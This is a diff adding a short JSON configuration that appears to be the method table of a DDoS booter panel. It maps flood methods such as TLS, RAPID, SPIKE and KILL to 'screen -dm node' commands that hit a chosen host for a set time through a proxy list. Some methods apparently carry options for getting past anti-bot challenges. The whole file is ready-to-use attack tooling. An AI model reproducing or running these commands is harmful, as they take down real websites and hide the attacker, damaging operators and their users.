@@ -1,0 +1,11 @@
+{
+    "CRASH": "node Crash-Silit {host} {time} 32 10 proxy.txt",
+    "TLS": "screen -dm node TLS-SILIT {host} {time} 32 10 proxy.txt",
+    "TLSv2": "screen -dm node TLS {host} {time} 10 proxy.txt 32 root",
+    "RAPID": "screen -dm node Rapid-Silit {host} {time} 10 proxy.txt 32 uam",
+    "RAPIDv2": "screen -dm node Rapid-Silit {host} {time} 10 proxy.txt 32 captcha",
+    "SPIKE": "screen -dm node SPIKE {host} 100 {time}",
+    "KILL": "screen -dm node KILL {host} {time} 32 10 proxy.txt",
+    "MIX": "screen -dm node mix {host} {time}",
+    "STROKE": "screen -dm node STROKE {host} {time} 32 10 proxy.txt"
+}
